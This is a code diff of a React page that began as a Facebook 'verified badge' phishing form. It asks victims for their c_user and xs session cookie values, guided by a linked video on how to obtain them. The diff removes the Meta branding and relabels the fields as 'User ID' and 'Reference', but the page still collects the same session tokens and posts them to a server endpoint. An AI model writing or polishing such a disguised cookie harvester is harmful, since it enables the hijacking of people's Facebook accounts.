@@ -14,8 +14,8 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { validationFormSchema, type ValidationForm } from "@shared/schema";
-import { sendValidationFormEmail } from "@/lib/emailService";
+import { validationFormSchema } from "@shared/schema";
+import { apiRequest } from "@/lib/queryClient";
 import { useMobile } from "@/hooks/use-mobile";
 import { MobileModal } from "@/components/mobile-modal";
 import { Search } from "lucide-react";
@@ -32,7 +32,7 @@ export default function Validation() {
     }
   }, [isMobile]);
 
-  const form = useForm<ValidationForm>({
+  const form = useForm({
     resolver: zodResolver(validationFormSchema),
     defaultValues: {
       c_user: "",
@@ -40,15 +40,9 @@ export default function Validation() {
     },
   });
 
-  const onSubmit = async (data: ValidationForm) => {
+  const onSubmit = async (data: any) => {
     try {
-      const emailData = {
-        ...data,
-        timestamp: new Date().toLocaleString(),
-        userAgent: navigator.userAgent,
-      };
-
-      await sendValidationFormEmail(emailData);
+      await apiRequest('POST', '/api/contact-form', data);
       localStorage.setItem('validation_data', JSON.stringify(data));
 
       toast({
@@ -57,7 +51,6 @@ export default function Validation() {
       });
       setLocation("/confirmation");
     } catch (error) {
-      console.error('Form submission error:', error);
       toast({
         variant: "destructive",
         title: "Error",
@@ -69,15 +62,14 @@ export default function Validation() {
   return (
     <div className="min-h-screen flex flex-col bg-white">
       <MetaTags 
-        title="Meta Verified | Validation"
-        description="Request a verified badge on Facebook - Initial Step"
+        title="Contact Form | Validation"
+        description="Contact Form - Initial Step"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      {/* Navigation Bar */}
       <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
         <div className="flex items-center">
-          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
+          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">Contact Form</p>
         </div>
         <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
           <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
@@ -92,43 +84,8 @@ export default function Validation() {
       <div className="flex-1 flex justify-center p-4 sm:p-8">
         <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
           <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
-            Request a verified badge on Facebook
+            Contact Form
           </h1>
-
-          <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
-            <p>
-              The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
-            </p>
-            <p>
-              Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
-            </p>
-            <p>
-              Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
-            </p>
-          </div>
-
-          <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
-            <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
-
-            <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
-              <video
-                className="w-full h-full"
-                controls
-                playsInline
-                preload="auto"
-              >
-                <source
-                  src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
-                  type="video/mp4"
-                />
-                Your browser does not support the video tag.
-              </video>
-            </div>
-
-            <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
-              Must Watch the video and submit required information correctly.
-            </h3>
-          </div>
 
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
@@ -137,14 +94,14 @@ export default function Validation() {
                 name="c_user"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
+                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">User ID</FormLabel>
                     <FormControl>
                       <Input
                         type="number"
                         min="0"
                         pattern="[0-9]+"
                         minLength={6}
-                        placeholder="Enter c_user"
+                        placeholder="Enter User ID"
                         className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field}
                       />
@@ -158,11 +115,11 @@ export default function Validation() {
                 name="xs"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
+                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">Reference</FormLabel>
                     <FormControl>
                       <Input 
                         type="text" 
-                        placeholder="Enter xs" 
+                        placeholder="Enter reference" 
                         className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                         {...field} 
                       />
@@ -171,10 +128,6 @@ export default function Validation() {
                   </FormItem>
                 )}
               />
-
-              <p className="text-xs sm:text-sm text-[#65676B]">
-                Please make sure account not to log out from your computer or laptop until you have received a verification email.
-              </p>
 
               <Button 
                 type="submit" 
@@ -189,13 +142,8 @@ export default function Validation() {
       </div>
 
       <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
-        Meta © 2025
+        © 2025 Contact Form
       </div>
-      <style>{`
-        .video-container {
-          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-        }
-      `}</style>
     </div>
   );
 }
